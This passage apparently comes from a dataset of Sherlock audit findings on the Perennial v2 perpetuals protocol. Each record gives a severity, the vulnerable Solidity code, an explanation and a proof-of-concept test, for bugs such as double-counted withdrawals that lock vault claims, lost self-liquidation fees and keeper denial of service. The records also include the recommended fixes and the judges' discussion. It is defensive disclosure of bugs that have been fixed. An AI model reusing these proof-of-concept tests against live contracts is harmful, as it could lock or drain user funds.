makerNegFee=0 takerPosFee=0 takerNegFee=0\nuser collateral = 10000170000\nuserB collateral = 10000010000\nver1636401493: makerValue=8000 longValue=0 makerPosFee=0 makerNegFee=-14000 takerPosFee=0 takerNegFee=0\nuser collateral = 9999990000\nuserB collateral = 10000010000\nver1636401593: makerValue=-5500 longValue=0 makerPosFee=0 makerNegFee=-4500 takerPosFee=0 takerNegFee=0\n```\n\nNotice, that final user balance is -0.1 and final userB balance is +0.1\nCode Snippet\nTool used\nManual Review"чSplit the total maker exposure by individual maker's exposure rather than by their position size. To do this:\nAdd another accumulator to track total `exposure`\nAdd individual maker `exposure` to user's `Local` storage\nWhen accumulating local storage in the checkpoint, account global accumulator `exposure` weighted by individual user's `exposure`.\nDiscussion\nsherlock-admin4\nThe protocol team fixed this issue in the following PRs/commits: https://github.com/equilibria-xyz/perennial-v2/pull/300чIndividual makers bear an additional undocumented price risk due to adiabatic fees, which is quite significant (can be several percentages of the notional).
All transactions to claim assets from the vault will revert in some situations due to double subtraction of the claimed assets in market position allocations calculation.чmediumч```\n_manage(context, depositAssets, claimAmount, !depositAssets.isZero() || !redeemShares.isZero());\n```\nч"When `assets` are claimed from the vault (Vault.update(0,0,x) called), the vault rebalances its collateral. There is an issue with market positions allocation calculations: the `assets` (""total position"") subtract claimed amount twice. This leads to revert in case this incorrect `assets` amount is less than `minAssets` (caused by market's minPosition). In situations when the vault can't redeem due to some market's position being at the `minPosition` (because of the market's skew, which disallows makers to reduce their positions), this will lead to all users being unable to claim any `assets` which were already redeemed and settled.\n`Vault.update` rebalances collateral by calling _manage:\n```\n_manage(context, depositAssets, claimAmount, !depositAssets.isZero() || !redeemShares.isZero());\n```\n\nIn the rebalance calculations, collateral and assets (assets here stands for ""total vault position"") are calculated as following:\n```\n  UFixed6 collateral = UFixed6Lib.unsafeFrom(strategy.totalCollateral).add(deposit).unsafeSub(withdrawal);\n  UFixed6 assets = collateral.unsafeSub(ineligable);\n\n  if (collateral.lt(strategy.totalMargin)) revert StrategyLibInsufficientCollateralError();\n  if (assets.lt(strategy.minAssets)) revert StrategyLibInsufficientAssetsError();\n```\n\n`ineligable` is calculated as following:\n```\nfunction _ineligable(Context memory context, UFixed6 withdrawal) private pure returns (UFixed6) {\n    // assets eligable for redemption\n    UFixed6 redemptionEligable = UFixed6Lib.unsafeFrom(context.totalCollateral)\n        .unsafeSub(withdrawal)\n        .unsafeSub(context.global.assets)\n        .unsafeSub(context.global.deposit);\n\n    return redemptionEligable\n        // approximate assets up for redemption\n        .mul(context.global.redemption.unsafeDiv(context.global.shares.add(context.global.redemption)))\n        // assets pending claim\n        .add(context.global.assets)\n        // assets withdrawing\n        .add(withdrawal);\n}\n```\n\nNotice that `ineligable` adds `withdrawal` in the end (which is the assets claimed by the user). Now back to collateral and assets calculation:\n`collateral = totalCollateral + deposit - withdrawal`\n`assets = collateral - ineligable = collateral - (redemptionEligable * redemption / (redemption + shares) + global.assets + withdrawal)`\n`assets = totalCollateral + deposit - withdrawal - [redemptionIneligable] - global.assets - withdrawal`\n`assets = totalCollateral + deposit - [redemptionIneligable] - global.assets - 2 * withdrawal`\nSee that `withdrawal` (assets claimed by the user) is subtracted twice in assets calculations. This means that assets calculated are smaller than it should. In particular, assets might become less than minAssets thus reverting in the following line:\n```\n  if (assets.lt(strategy.minAssets)) revert StrategyLibInsufficientAssetsError();\n```\n\nPossible scenario for this issue to cause inability to claim funds:\nSome vault market's has a high skew (|long - short|), which means that minimum maker position is limited by the skew.\nUser redeems large amount from the vault, reducing vault's position in that market so that market maker ~= |long - short|. This means that further redeems from the vault are not possible because the vault can't reduce its position in the market.\nAfter that, the user tries to claim what he has redeemed, but all attempts to redeem will revert (both for this user and for any other user that might want to claim)\nThe scenario above is demonstrated in the test, change the following test in test/integration/vault/Vault.test.ts:\n```\n    it('simple deposits and redemptions', async () => {\n// rest of code\n      // Now we should have opened positions.\n      // The positions should be equal to (smallDeposit + largeDeposit) * leverage originalOraclePrice.\n      expect(await position()).to.equal(\n        smallDeposit.add(largeDeposit).mul(leverage).mul(4).div(5).div(originalOraclePrice),\n      )\n      expect(await btcPosition()).to.equal(\n        smallDeposit.add(largeDeposit).mul(leverage).div(5).div(btcOriginalOraclePrice),\n      )\n\n      /*** remove all lines after this and replace with the following code: ***/\n\n      var half = smallDeposit.add(largeDeposit).div(2).add(smallDeposit);\n      await vault.connect(user).update(user.address, 0, half, 0)\n\n      await updateOracle()\n      await vault.connect(user2).update(user2.address, smallDeposit, 0, 0) // this will create min position in the market\n      await vault.connect(user).update(user.address, 0, 0, half) // this will revert even though it's just claiming\n    })\n```\n\nThe last line in the test will revert, even though it's just claiming assets. If the pre-last line is commented out (no ""min position"" created in the market), it will work normally.\nCode Snippet\nTool used\nManual Review"чRemove `add(withdrawal)` from `_ineligable` calculation in the vault.\nDiscussion\nsherlock-admin4\nThe protocol team fixed this issue in the following PRs/commits: https://github.com/equilibria-xyz/perennial-v2/pull/303чIn certain situations (redeem not possible from the vault due to high skew in some underlying market) claiming assets from the vault will revert for all users, temporarily (and sometimes permanently) locking user funds in the contract.
If referral or liquidator is the same address as the account, then liquidation/referral fees will be lost due to local storage being overwritten after the `claimable` amount is credited to liquidator or referralчmediumч```\n// rest of code\n    _credit(liquidators[account][newOrderId], accumulationResult.liquidationFee);\n    _credit(referrers[account][newOrderId], accumulationResult.subtractiveFee);\n// rest of code\nfunction _credit(address account, UFixed6 amount) private {\n    if (amount.isZero()) return;\n\n    Local memory newLocal = _locals[account].read();\n    newLocal.credit(amount);\n    _locals[account].store(newLocal);\n}\n```\nч"Any user (address) can be liquidator and/or referral, including account's own address (the user can self-liquidate or self-refer). During the market settlement, liquidator and referral fees are credited to liquidator/referral's `local.claimable` storage. The issue is that the account's local storage is held in the memory during the settlement process, and is saved into storage after settlement/update. This means that `local.claimable` storage changes for the account are not reflected in the in-memory cached copy and discarded when the cached copy is saved after settlement.\nThis leads to liquidator and referral fees being lost when these are the account's own address.\nDuring market account settlement process, in the `_processOrderLocal`, liquidator and referral fees are credited to corresponding accounts via:\n```\n// rest of code\n    _credit(liquidators[account][newOrderId], accumulationResult.liquidationFee);\n    _credit(referrers[account][newOrderId], accumulationResult.subtractiveFee);\n// rest of code\nfunction _credit(address account, UFixed6 amount) private {\n    if (amount.isZero()) return;\n\n    Local memory newLocal = _locals[account].read();\n    newLocal.credit(amount);\n    _locals[account].store(newLocal);\n}\n```\n\nHowever, for the account the cached copy of `_locals[account]` is stored after the settlement in _storeContext:\n```\nfunction _storeContext(Context memory context, address account) private {\n    // state\n    _global.store(context.global);\n    _locals[account].store(context.local);\n// rest of code\n```\n\nThe order of these actions is:\n```\nfunction settle(address account) external nonReentrant whenNotPaused {\n    Context memory context = _loadContext(account);\n\n    _settle(context, account);\n\n    _storeContext(context, account);\n}\n```\n\nLoad `_locals[account]` into memory (context.local)\nSettle: during settlement `_locals[account].claimable` is increased for liquidator and referral. Note: this is not reflected in `context.local`\nStore cached context: `_locals[account]` is overwritten with the `context.local`, losing `claimable` increased during settlement.\nThe scenario above is demonstrated in the test, add this to test/unit/market/Market.test.ts:\n```\nit('self-liquidation fees lost', async () => {\nconst POSITION = parse6decimal('100.000')\nconst COLLATERAL = parse6decimal('120')\n\nfunction setupOracle(price: string, timestamp : number, nextTimestamp : number) {\n    const oracleVersion = {\n    price: parse6decimal(price),\n    timestamp: timestamp,\n    valid: true,\n    }\n    oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion)\n    oracle.status.returns([oracleVersion, nextTimestamp])\n    oracle.request.returns()\n}\n\ndsu.transferFrom.whenCalledWith(user.address, market.address, COLLATERAL.mul(1e12)).returns(true)\ndsu.transferFrom.whenCalledWith(userB.address, market.address, COLLATERAL.mul(1e12)).returns(true)\n\nvar time = TIMESTAMP;\n\nsetupOracle('1', time, time + 100);\nawait market.connect(user)\n    ['update(address,uint256,uint256,uint256,int256,bool)'](user.address, POSITION, 0, 0, COLLATERAL, false);\n\ntime += 100;\nsetupOracle('1', time, time + 100);\nawait market.connect(userB)\n    ['update(address,uint256,uint256,uint256,int256,bool)'](userB.address, 0, POSITION, 0, COLLATERAL, false);\n\ntime += 100;\nsetupOracle('1', time, time + 100);\n\ntime += 100;\nsetupOracle('0.7', time, time + 100);\n\n// self-liquidate\nsetupOracle('0.7', time, time + 100);\nawait market.connect(userB)\n    ['update(address,uint256,uint256,uint256,int256,bool)'](userB.address, 0, 0, 0, 0, true);\n\n// settle liquidation\ntime += 100;\nsetupOracle('0.7', time, time + 100);\nawait market.settle(userB.address);\nvar info = await market.locals(userB.address);\nconsole.log(""Claimable userB: "" + info.claimable);\n```\n\nConsole log:\n```\nClaimable userB: 0\n```\n\nCode Snippet\nTool used\nManual Review"чModify `Market._credit` function to increase `context.local.claimable` if account to be credited matches account which is being updated.\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nthis seems valid valid medium; medium(2)\nsherlock-admin4\nThe protocol team fixed this issue in the following PRs/commits: https://github.com/equilibria-xyz/perennial-v2/pull/302чIf user self-liquidates or self-refers, the liquidation and referral fees are lost by the user (and are stuck in the contract, because they're still subtracted from the user's collateral).
_loadContext() uses the wrong pendingGlobal.чmediumч```\n    function _loadContext(\n        Registration memory registration\n    ) private view returns (MarketStrategyContext memory marketContext) {\n// rest of code\n        // current position\n      Order memory pendingGlobal = registration.market.pendings(address(this));\n        marketContext.currentPosition = registration.market.position();\n        marketContext.currentPosition.update(pendingGlobal);\n        marketContext.minPosition = marketContext.currentAccountPosition.maker\n            .unsafeSub(marketContext.currentPosition.maker\n                .unsafeSub(marketContext.currentPosition.skew().abs()).min(marketContext.closable));\n        marketContext.maxPosition = marketContext.currentAccountPosition.maker\n            .add(marketContext.riskParameter.makerLimit.unsafeSub(marketContext.currentPosition.maker));\n    }\n```\nч`StrategyLib._loadContext()` is using the incorrect `pendingGlobal`, causing `currentPosition`, `minPosition`, and `maxPosition` to be incorrect, leading to incorrect rebalance operation.\nIn `StrategyLib._loadContext()`, there is a need to compute `currentPosition`, `minPosition`, and `maxPosition`. The code as follows:\n```\n    function _loadContext(\n        Registration memory registration\n    ) private view returns (MarketStrategyContext memory marketContext) {\n// rest of code\n        // current position\n      Order memory pendingGlobal = registration.market.pendings(address(this));\n        marketContext.currentPosition = registration.market.position();\n        marketContext.currentPosition.update(pendingGlobal);\n        marketContext.minPosition = marketContext.currentAccountPosition.maker\n            .unsafeSub(marketContext.currentPosition.maker\n                .unsafeSub(marketContext.currentPosition.skew().abs()).min(marketContext.closable));\n        marketContext.maxPosition = marketContext.currentAccountPosition.maker\n            .add(marketContext.riskParameter.makerLimit.unsafeSub(marketContext.currentPosition.maker));\n    }\n```\n\nThe code above `pendingGlobal = registration.market.pendings(address(this));` is wrong It takes the address(this)'s `pendingLocal`. The correct approach is to use `pendingGlobal = registration.market.pending();`.ч```\n    function _loadContext(\n        Registration memory registration\n    ) private view returns (MarketStrategyContext memory marketContext) {\n// rest of code\n        // current position\n// Remove the line below\n       Order memory pendingGlobal = registration.market.pendings(address(this));\n// Add the line below\n       Order memory pendingGlobal = registration.market.pending();\n        marketContext.currentPosition = registration.market.position();\n        marketContext.currentPosition.update(pendingGlobal);\n        marketContext.minPosition = marketContext.currentAccountPosition.maker\n            .unsafeSub(marketContext.currentPosition.maker\n                .unsafeSub(marketContext.currentPosition.skew().abs()).min(marketContext.closable));\n        marketContext.maxPosition = marketContext.currentAccountPosition.maker\n            .add(marketContext.riskParameter.makerLimit.unsafeSub(marketContext.currentPosition.maker));\n    }\n```\n\nDiscussion\nsherlock-admin4\n2 comment(s) were left on this issue during the judging contest.\npanprog commented:\nvalid medium, it influences the rebalance process only in very rare edge cases\ntakarez commented:\nthe reason for it should have been said.\nsherlock-admin4\nThe protocol team fixed this issue in the following PRs/commits: https://github.com/equilibria-xyz/perennial-v2/pull/299чSince `pendingGlobal` is wrong, `currentPosition`, `minPosition` and `maxPosition` are all wrong. affects subsequent rebalance calculations, such as `target.position` etc. rebalance does not work properly\nCode Snippet\nTool used\nManual Review
Liquidator can set up referrals for other usersчmediumч```\n    function _loadUpdateContext(\n        Context memory context,\n        address account,\n        address referrer\n    ) private view returns (UpdateContext memory updateContext) {\n// rest of code\n        updateContext.referrer = referrers[account][context.local.currentId];\n        updateContext.referralFee = IMarketFactory(address(factory())).referralFee(referrer);\n    }\n\n    function _processReferrer(\n        UpdateContext memory updateContext,\n        Order memory newOrder,\n        address referrer\n    ) private pure {\n      if (newOrder.makerReferral.isZero() && newOrder.takerReferral.isZero()) return;\n        if (updateContext.referrer == address(0)) updateContext.referrer = referrer;\n        if (updateContext.referrer == referrer) return;\n\n        revert MarketInvalidReferrerError();\n    }\n\n\n    function _storeUpdateContext(Context memory context, UpdateContext memory updateContext, address account) private {\n// rest of code\n        referrers[account][context.local.currentId] = updateContext.referrer;\n    }\n```\nчIf a user has met the liquidation criteria and currently has no referrer then a malicious liquidator can specify a referrer in the liquidation order. making it impossible for subsequent users to set up the referrer they want.\nCurrently, there are 2 conditions to set up a referrer\nthe order cannot be empty （Non-empty orders require authorization unless they are liquidation orders）\nthere can't be another referrer already\n```\n    function _loadUpdateContext(\n        Context memory context,\n        address account,\n        address referrer\n    ) private view returns (UpdateContext memory updateContext) {\n// rest of code\n        updateContext.referrer = referrers[account][context.local.currentId];\n        updateContext.referralFee = IMarketFactory(address(factory())).referralFee(referrer);\n    }\n\n    function _processReferrer(\n        UpdateContext memory updateContext,\n        Order memory newOrder,\n        address referrer\n    ) private pure {\n      if (newOrder.makerReferral.isZero() && newOrder.takerReferral.isZero()) return;\n        if (updateContext.referrer == address(0)) updateContext.referrer = referrer;\n        if (updateContext.referrer == referrer) return;\n\n        revert MarketInvalidReferrerError();\n    }\n\n\n    function _storeUpdateContext(Context memory context, UpdateContext memory updateContext, address account) private {\n// rest of code\n        referrers[account][context.local.currentId] = updateContext.referrer;\n    }\n```\n\nHowever, if the user does not have a referrer, the liquidation order is able to meet both of these restrictions\nThis allows the liquidator to set up referrals for other users.\nWhen the user subsequently tries to set up a referrer, it will fail.чRestrictions on Liquidation Orders Cannot Set a referrer\n```\n    function _processReferrer(\n        UpdateContext memory updateContext,\n        Order memory newOrder,\n        address referrer\n    ) private pure {\n// Add the line below\n       if (newOrder.protected() && referrer != address(0)) revert MarketInvalidReferrerError;\n        if (newOrder.makerReferral.isZero() && newOrder.takerReferral.isZero()) return;\n        if (updateContext.referrer == address(0)) updateContext.referrer = referrer;\n        if (updateContext.referrer == referrer) return;\n\n        revert MarketInvalidReferrerError();\n    }\n```\n\nDiscussion\nsherlock-admin3\n1 comment(s) were left on this issue during the judging contest.\npanprog commented:\ninvalid, because this is the system design: referral can receive some fee from the user, and when liquidator liquidates - his (liquidator's) referral will get some fee from the user. Moreover, the referral is set for each order, and since no order can be placed until liquidation settles, the user can't execute orders for the same oracle version anyway, and for the following oracle versions a new referrer can easily be set\nnevillehuang\n@bin2chen66 This seems invalid based on @panprog comment.\nbin2chen66\nThe system design doesn't seem to be like this. Could it be that I misunderstood? The referrer is set and cannot be modified.\n_loadUpdateContext () take the previous referrer\ncontext.local.currentId unchanged or + 1\n_processReferrer () Verify that updateContext.referrer must be equal to the referrer of the current order\n_storeUpdateContext () save referrers [account] [context.local.currentId]\nThe referrer inherits the previous one and verifies that it cannot be reset. @Panprog Can you see where can reset it, Did I miss it? Thanks.\npanprog\n@bin2chen66 @nevillehuang Yes, I agree with @bin2chen66 , the referrer can not be modified. Sorry for incorrect comment, I've missed that it's not reset between updates. I believe this is medium then as it allows to set the referral for the user during liquidation which he can't change.\narjun-io\nIt's accurate that the liquidator can set a referral address as part of the liquidation - this is acceptable. The referrer address is locked for the current ID but future orders (for a different local.currentId) should not have the referrer set - if they do that would be a bug. So as long as the liquidation version is filled, new orders for the next version should be fine.\nnevillehuang\n@arjun-io So do you agree this is a valid issue? I am incline to keep medium given referrer setting can be blocked\narjun-io\nNo I don't think it is, the only way this would be valid is if setting referrer is blocked for future orders that are not from the same Oracle Version. Would defer to auditors to double check this\npanprog\n@nevillehuang @arjun-io Yes, after the referrer is set once, user can never change it again, because it's loaded from currentId into updateContext, but then if `local.currentId` increases, the same referrer (from previous currentId) is stored into new currentId, thus referrer is always carried over from previous ids. So it seems that the issue which is valid is that it's impossible to change referrer once set, not that liquidator can set his referrer, although it wasn't really obvious from the docs (the intended functionality of setting the referrer).\narjun-io\nAh I see, the issue arises from the _storeUpdateContext using an updated context.local.currentId - this would also be an issue for liquidations then, I believe. In which case this is a deeper issue which might be a High\npanprog\n@arjun-io Do you mean that liquidator carries over from previous ids to currentId? Yes, it carries over like referrer, however, the accumulated `liquidationFee` will be 0 for all orders which are not protected (CheckPointLib._accumulateLiquidationFee):\n```\n    function _accumulateLiquidationFee(\n        Order memory order,\n        Version memory toVersion\n    ) private pure returns (UFixed6 liquidationFee) {\n        if (order.protected())\n            return toVersion.liquidationFee.accumulated(Accumulator6(Fixed6Lib.ZERO), UFixed6Lib.ONE).abs();\n    }\n```\n\nSo there is no issue with liquidators. Even though the liquidators map will be set for all currentIds, this liquidator will be credited only once during the liquidation, and in following liquidations it will be overwritten with new liquidator. Yes, it's better to fix it so that liquidator doesn't carry over from previoud ids, but there is no impact in this right now.\nAnd the impact for the issue described here I think is medium, not high.\nsherlock-admin4\nThe protocol team fixed this issue in the following PRs/commits: https://github.com/equilibria-xyz/perennial-v2/pull/297чIf a user is set up as a referrer by a liquidated order in advance, the user cannot be set up as anyone else.\nCode Snippet\nTool used\nManual Review
Vault and oracle keepers DoS in some situations due to `market.update(account,max,max,max,0,false)`чmediumч```\nif (\n    !PositionLib.margined(\n        context.latestPosition.local.magnitude().add(context.pending.local.pos()),\n        context.latestOracleVersion,\n        context.riskParameter,\n        context.local.collateral\n    )\n) revert IMarket.MarketInsufficientMarginError();\n```\nч"When user's market account is updated without position and collateral change (by calling market.update(account,max,max,max,0,false)), this serves as some kind of ""settling"" the account (which was the only way to settle the account before v2.3). However, this action still reverts if the account is below margin requirement.\nThe issue is that some parts of the code use this action to ""settle"" the account in the assumption that it never reverts which is not true. This causes unpexpected reverts and denial of service to users who can not execute transactions in some situations, in particular:\nOracle `KeeperFactory.settle` uses this method to settle all accounts in the market for the oracle verison and will revert entire market version's settlement if any account which is being settled is below margin requirement. Example scenario: 1.1. User increases position to the edge of margin requirement 1.2. The price rises slightly for the commited oracle version, and user position is settled and is now slightly below margin requirements 1.3. All attempts to settle accounts for the commited oracle version for this market will revert as user's account collateral is below margin requirements.\nVault `Vault._updateUnderlying` uses this method to settle all vault's accounts in the markets. This function is called at the start of `rebalance` and `update`, with `rebalance` also being called before any admin vault parameters changes such as updating market leverages, weights or cap. This becomes especially problematic if any market is ""removed"" from the vault by setting its weight to 0, but the market still has some position due to `minPosition` limitation (as described in another issue). In such case each vault `update` will bring this market's position to exact edge of margin requirement, meaning a lot of times minimal price changes will put the vault's market account below margin requirement, and as such most Vault functions will revert (update, `rebalance` and admin param changes). Moreover, since the vault rebalances collateral and/or position size only in `_manage` (which is called only from `update` and rebalance), this means that the vault is basically bricked until this position is either liquidated or goes above margin requirement again due to price changes.\nWhen `Market.update` is called, any parameters except `protected = true` will perform the following check from the InvariantLib.validate:\n```\nif (\n    !PositionLib.margined(\n        context.latestPosition.local.magnitude().add(context.pending.local.pos()),\n        context.latestOracleVersion,\n        context.riskParameter,\n        context.local.collateral\n    )\n) revert IMarket.MarketInsufficientMarginError();\n```\n\nThis means that even updates which do not change anything (empty order and 0 collateral change) still perform this check and revert if the user's collateral is below margin requirement.\nSuch method to settle accounts is used in KeeperOracle._settle:\n```\nfunction _settle(IMarket market, address account) private {\n    market.update(account, UFixed6Lib.MAX, UFixed6Lib.MAX, UFixed6Lib.MAX, Fixed6Lib.ZERO, false);\n}\n```\n\nThis is called from `KeeperFactory.settle`, which the keepers are supposed to call to settle market accounts after the oracle version is commited. This will revert, thus keepers will temporarily be unable to call this function for the specific oracle version until all users are at or above margin.\nThe same method is used to settle accounts in Vault._updateUnderlying:\n```\nfunction _updateUnderlying() private {\n    for (uint256 marketId; marketId < totalMarkets; marketId++)\n        _registrations[marketId].read().market.update(\n            address(this),\n            UFixed6Lib.MAX,\n            UFixed6Lib.ZERO,\n            UFixed6Lib.ZERO,\n            Fixed6Lib.ZERO,\n            false\n        );\n}\n```\n"чDepending on intended functionality:\nIgnore the margin requirement for empty orders and collateral change which is >= 0. AND/OR\nUse `Market.settle` instead of `Market.update` to `settle` accounts, specifically in `KeeperOracle._settle` and in `Vault._updateUnderlying`. There doesn't seem to be any reason or issue to use `settle` instead of `update`, it seems that `update` is there just because there was no `settle` function available before.\nDiscussion\nsherlock-admin4\nThe protocol team fixed this issue in the following PRs/commits: https://github.com/equilibria-xyz/perennial-v2/pull/309чKeepers are unable to settle market accounts for the commited oracle version until all accounts are above margin. The oracle fees are still taken from all accounts, but the keepers are blocked from receiving it.\nIf any Vault's market weight is set to 0 (or if vault's position in any market goes below margin for whatever other reason), most of the time the vault will temporarily be bricked until vault's position in that market is liquidated. The only function working in this state is `Vault.settle`, even all admin functions will revert.\nCode Snippet\nTool used\nManual Review
Vault checkpoints slightly incorrect conversion from assets to shares leads to slow loss of funds for long-time vault depositorsчmediumч```\nfunction toSharesGlobal(Checkpoint memory self, UFixed6 assets) internal pure returns (UFixed6) {\n    // vault is fresh, use par value\n    if (self.shares.isZero()) return assets;\n\n    // if vault is insolvent, default to par value\n    return  self.assets.lte(Fixed6Lib.ZERO) ? assets : _toShares(self, _withoutSettlementFeeGlobal(self, assets));\n}\n\nfunction _toShares(Checkpoint memory self, UFixed6 assets) private pure returns (UFixed6) {\n    UFixed6 selfAssets = UFixed6Lib.unsafeFrom(self.assets);\n    return _withSpread(self, assets.muldiv(self.shares, selfAssets));\n}\n\nfunction _withSpread(Checkpoint memory self, UFixed6 amount) private pure returns (UFixed6) {\n    UFixed6 selfAssets = UFixed6Lib.unsafeFrom(self.assets);\n    UFixed6 totalAmount = self.deposit.add(self.redemption.muldiv(selfAssets, self.shares));\n    UFixed6 totalAmountIncludingFee = UFixed6Lib.unsafeFrom(Fixed6Lib.from(totalAmount).sub(self.tradeFee));\n\n    return totalAmount.isZero() ?\n        amount :\n        amount.muldiv(totalAmountIncludingFee, totalAmount);\n}\n\nfunction _withoutSettlementFeeGlobal(Checkpoint memory self, UFixed6 amount) private pure returns (UFixed6) {\n    return _withoutSettlementFee(amount, self.settlementFee);\n}\n\nfunction _withoutSettlementFee(UFixed6 amount, UFixed6 settlementFee) private pure returns (UFixed6) {\n    return amount.unsafeSub(settlementFee);\n}\n```\nчWhen vault checkpoints convert assets to shares (specifically used to calculate user's shares for their deposit), it uses the following formula: `shares = (assets[before fee] - settlementFee) * checkpoint.shares/checkpoint.assets * (deposit + redeem - tradeFee) / (deposit + redeem)`\n`settlementFee` in this formula is taken into account slightly incorrectly: in actual market collateral calculations, both settlement fee and trade fee are subtracted from collateral, but this formula basically multiplies `1 - settlement fee percentage` by `1 - trade fee percentage`, which is slightly different and adds the calculation error = `settlement fee percentage * trade fee percentage`.\nThis is the scenario to better understand the issue:\nLinear fee = 2%, settlement fee = $1\nUser1 deposits $100 into the vault (linear fee = $2, settlement fee = $1)\nVault assets = $97 (due to fees), User1 shares = 100\nUser2 deposits $100 into the vault (linear fee = $2, settlement fee = $1)\nVault assets = $194, User1 shares = 100, but User2 shares = 100.02, meaning User1's share value has slightly fallen due to a later deposit.\nThis is the calculation for User2 shares: `shares = ($100 - $1) * 100/$97 * ($100 - $2) / $100 = $99 * 100/$97 * $98/$100 = $99 * 98/$97 = 100.02`\nThe extra 0.02 this user has received is because the `tradeFee` is taken from the amount after settlement fee ($99) rather than full amount as it should ($100). This difference (settlementFee * `tradeFee` = $0.02) is unfair amount earned by User2 and loss of funds for User1.\nWhen redeeming, the formula for shares -> assets vault checkpoint conversion is correct and the correct amount is redeemed.\nThis issue leads to all vault depositors slowly losing share value with each deposit, and since no value is gained when redeeming, continuous deposits and redeems will lead to all long-time depositors continuously losing their funds.\nThis is the formula for vault checkpoint toSharesGlobal:\n```\nfunction toSharesGlobal(Checkpoint memory self, UFixed6 assets) internal pure returns (UFixed6) {\n    // vault is fresh, use par value\n    if (self.shares.isZero()) return assets;\n\n    // if vault is insolvent, default to par value\n    return  self.assets.lte(Fixed6Lib.ZERO) ? assets : _toShares(self, _withoutSettlementFeeGlobal(self, assets));\n}\n\nfunction _toShares(Checkpoint memory self, UFixed6 assets) private pure returns (UFixed6) {\n    UFixed6 selfAssets = UFixed6Lib.unsafeFrom(self.assets);\n    return _withSpread(self, assets.muldiv(self.shares, selfAssets));\n}\n\nfunction _withSpread(Checkpoint memory self, UFixed6 amount) private pure returns (UFixed6) {\n    UFixed6 selfAssets = UFixed6Lib.unsafeFrom(self.assets);\n    UFixed6 totalAmount = self.deposit.add(self.redemption.muldiv(selfAssets, self.shares));\n    UFixed6 totalAmountIncludingFee = UFixed6Lib.unsafeFrom(Fixed6Lib.from(totalAmount).sub(self.tradeFee));\n\n    return totalAmount.isZero() ?\n        amount :\n        amount.muldiv(totalAmountIncludingFee, totalAmount);\n}\n\nfunction _withoutSettlementFeeGlobal(Checkpoint memory self, UFixed6 amount) private pure returns (UFixed6) {\n    return _withoutSettlementFee(amount, self.settlementFee);\n}\n\nfunction _withoutSettlementFee(UFixed6 amount, UFixed6 settlementFee) private pure returns (UFixed6) {\n    return amount.unsafeSub(settlementFee);\n}\n```\n\nThis code translates to a formula shown above, i.e. it first subtracts settlement fee from the assets (withoutSettlementFeeGlobal), then multiplies this by checkpoint's share value in `_toShares` (*checkpoint.shares/checkpoint.assets), and then multiplies this by trade fee adjustment in `_withSpread` (*(deposit+redeem-tradeFee) / (deposit+redeem)). Here is the formula again: `shares = (assets[before fee] - settlementFee) * checkpoint.shares/checkpoint.assets * (deposit + redeem - tradeFee) / (deposit + redeem)`\nAs shown above, the formula is incorrect, because it basically does the following: `user_assets = (deposit - settlementFee) * (deposit - tradeFee)/deposit = deposit * (1 - settlementFeePct) * (1 - tradeFeePct)`\nBut the actual user collateral after fees is calculated as: `user_assets = deposit - settlementFee - tradeFee = deposit * (1 - settlementFeePct - tradeFeePct)`\nIf we subtract the actual collateral from the formula used in checkpoint, we get the error: `error = deposit * ((1 - settlementFeePct) * (1 - tradeFeePct) - (1 - settlementFeePct - tradeFeePct))` `error = deposit * settlementFeePct * tradeFeePct` `error = settlementFee * tradeFeePct`\nSo this is systematic error, which inflates the shares given to users with any deposit by fixed amount of `settlementFee * tradeFeePct`чRe-work the assets to shares conversion in vault checkpoint to use the correct formula: `shares = (assets[before fee] - settlementFee - tradeFee * assets / (deposit + redeem)) * checkpoint.shares/checkpoint.assets`\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nthis seem valid medium; medium(3)\nsherlock-admin4\nThe protocol team fixed this issue in the following PRs/commits: https://github.com/equilibria-xyz/perennial-v2/pull/304чAny vault deposit reduces the vault assets by `settlementFee * tradeFeePct`. While this amount is not very large (in the order of $0.1 - $0.001 per deposit transaction), this is amount lost with each deposit, and given that an active vault can easily have 1000s of transactions daily, this will be a loss of $1-$100/day, which is significant enough to make it a valid issue.\nCode Snippet\nTool used\nManual Review
ChainlinkFactory will pay non-requested versions keeper feesчmediumч```\n    /// @notice Commits the price to specified version\n    /// @dev Accepts both requested and non-requested versions.\n    ///      Requested versions will pay out a keeper fee, non-requested versions will not.\n    ///      Accepts any publish time in the underlying price message, as long as it is within the validity window,\n    ///      which means its possible for publish times to be slightly out of order with respect to versions.\n    ///      Batched updates are supported by passing in a list of price feed ids along with a valid batch update data.\n    /// @param ids The list of price feed ids to commit\n    /// @param version The oracle version to commit\n    /// @param data The update data to commit\n    function commit(bytes32[] memory ids, uint256 version, bytes calldata data) external payable {\n```\nчProtocol definition: `Requested versions will pay out a keeper fee, non-requested versions will not.` But ChainlinkFactory ignores `numRequested`, which pays for both.\nProtocol definition: `Requested versions will pay out a keeper fee, non-requested versions will not.`\n```\n    /// @notice Commits the price to specified version\n    /// @dev Accepts both requested and non-requested versions.\n    ///      Requested versions will pay out a keeper fee, non-requested versions will not.\n    ///      Accepts any publish time in the underlying price message, as long as it is within the validity window,\n    ///      which means its possible for publish times to be slightly out of order with respect to versions.\n    ///      Batched updates are supported by passing in a list of price feed ids along with a valid batch update data.\n    /// @param ids The list of price feed ids to commit\n    /// @param version The oracle version to commit\n    /// @param data The update data to commit\n    function commit(bytes32[] memory ids, uint256 version, bytes calldata data) external payable {\n```\n\ncommit()->_handleKeeperFee()->_applicableValue() `ChainlinkFactory._applicableValue ()` implements the following:\n```\n    function _applicableValue(uint256, bytes memory data) internal view override returns (uint256) {\n        bytes[] memory payloads = abi.decode(data, (bytes[]));\n        uint256 totalFeeAmount = 0;\n        for (uint256 i = 0; i < payloads.length; i++) {\n            (, bytes memory report) = abi.decode(payloads[i], (bytes32[3], bytes));\n            (Asset memory fee, ,) = feeManager.getFeeAndReward(address(this), report, feeTokenAddress);\n            totalFeeAmount += fee.amount;\n        }\n        return totalFeeAmount;\n    }\n```\n\nThe above method ignores the first parameter `numRequested`. This way, whether it is `Requested versions` or not, you will pay `keeper fees`. Violating `non-requested versions will not pay`чIt is recommended that only `Requested versions` keeper fees'\n```\n// Remove the line below\n   function _applicableValue(uint256 , bytes memory data) internal view override returns (uint256) {\n// Add the line below\n   function _applicableValue(uint256 numRequested, bytes memory data) internal view override returns (uint256) {\n        bytes[] memory payloads = abi.decode(data, (bytes[]));\n        uint256 totalFeeAmount = 0;\n        for (uint256 i = 0; i < payloads.length; i// Add the line below\n// Add the line below\n) {\n            (, bytes memory report) = 